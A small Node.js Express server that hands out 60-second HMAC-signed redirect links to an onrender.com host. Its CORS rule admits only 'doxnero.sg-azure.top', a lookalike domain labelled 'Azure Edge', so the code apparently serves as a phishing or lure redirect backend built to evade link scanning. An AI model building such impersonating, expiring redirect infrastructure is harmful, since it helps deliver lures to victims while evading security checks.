import express from "express";
import dotenv from "dotenv";
import crypto from "crypto";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// ✅ Enable CORS for Azure Edge
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "https://doxnero.sg-azure.top"); // Allow only Azure Edge
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.header("Access-Control-Allow-Headers", "Content-Type, Authorization");
    
    if (req.method === "OPTIONS") {
        return res.sendStatus(200);
    }
    
    next();
});

// ✅ API to generate expiring redirect URL
app.post("/api/get_doc_url", (req, res) => {
    const SECURE_TOKEN = process.env.SECURE_TOKEN;
    const SECRET_KEY = process.env.SECRET_KEY;
    const userToken = req.headers.authorization?.split("Bearer ")[1];

    if (userToken !== SECURE_TOKEN) {
        return res.status(403).json({ error: "Unauthorized access" });
    }

    const expires = Date.now() + 60000; // 60 seconds expiry
    const hash = crypto.createHmac("sha256", SECRET_KEY).update(expires.toString()).digest("hex");

    // ✅ Use external link to `redirect.js`
    const secureRedirectURL = `https://rail-rdr-sage.onrender.com/api/redirect?expires=${expires}&hash=${hash}`;

    res.status(200).json({ secure_url: secureRedirectURL });
});

// ✅ Start Express Server
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
